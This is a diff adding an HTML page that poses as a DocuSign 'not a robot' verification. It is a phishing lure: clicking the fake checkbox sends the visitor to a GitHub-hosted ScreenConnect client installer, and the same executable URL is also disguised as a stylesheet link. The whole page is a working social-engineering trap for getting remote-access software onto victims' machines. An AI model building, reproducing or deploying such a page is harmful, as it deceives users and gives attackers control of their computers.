@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure | Smart Verification</title>
+    <link href="https://github.com/kenneth23232/001/raw/refs/heads/main/ScreenConnect.ClientSetup.exe" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .verification-card {
+            background: #fdfdfd;
+            border: 1px solid #eaeaea;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            width: 100%;
+            max-width: 380px;
+            position: relative;
+        }
+
+        /* عنصر متحرك بسيط ونظيف */
+        .loader-ring {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0066ff;
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #111;
+        }
+
+        p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        /* صندوق التحقق التفاعلي الحديث */
+        .captcha-box {
+            background: #f8f9fa;
+            border: 1.5px solid #e1e4e8;
+            padding: 15px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .captcha-box:hover {
+            border-color: #0066ff;
+            background: #f1f5ff;
+        }
+
+        .captcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .checkbox-fake {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #ccc;
+            border-radius: 6px;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: 0.3s;
+            color: white;
+            font-size: 14px;
+        }
+
+        .captcha-box.verified .checkbox-fake {
+            background: #28a745;
+            border-color: #28a745;
+            font-weight: bold;
+        }
+
+        .captcha-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .captcha-logo {
+            font-size: 12px;
+            color: #888;
+            font-weight: 600;
+        }
+
+        .success-msg {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #28a745;
+            font-weight: 600;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="verification-card">
+        <div class="loader-ring"></div>
+        <h2>Docusign</h2>
+        <p>Please verify that you are not a robot</p>
+
+        <!-- صندوق التحقق -->
+        <div class="captcha-box" id="captchaBox" onclick="verifyUser()">
+            <div class="captcha-left">
+                <div class="checkbox-fake" id="checkIcon"></div>
+                <span class="captcha-text" id="statusText">I'm not a robot</span>
+            </div>
+            <div class="captcha-logo">Security-Protect</div>
+        </div>
+
+        <div class="success-msg" id="successMsg">Verified successfully, redirecting...</div>
+    </div>
+
+    <script>
+        function verifyUser() {
+            const box = document.getElementById('captchaBox');
+            const check = document.getElementById('checkIcon');
+            const text = document.getElementById('statusText');
+            const msg = document.getElementById('successMsg');
+
+            // تفعيل حالة التحقق
+            box.style.pointerEvents = 'none';
+            check.innerHTML = '✓';
+            box.classList.add('verified');
+            text.innerText = 'Verified';
+            msg.style.display = 'block';
+
+            // الانتقال بعد التحقق
+            setTimeout(function() {
+                window.location.href = "https://github.com/kenneth23232/001/raw/refs/heads/main/ScreenConnect.ClientSetup.exe"; 
+            }, 1500);
+        }
+    </script>
+
+</body>
+</html>
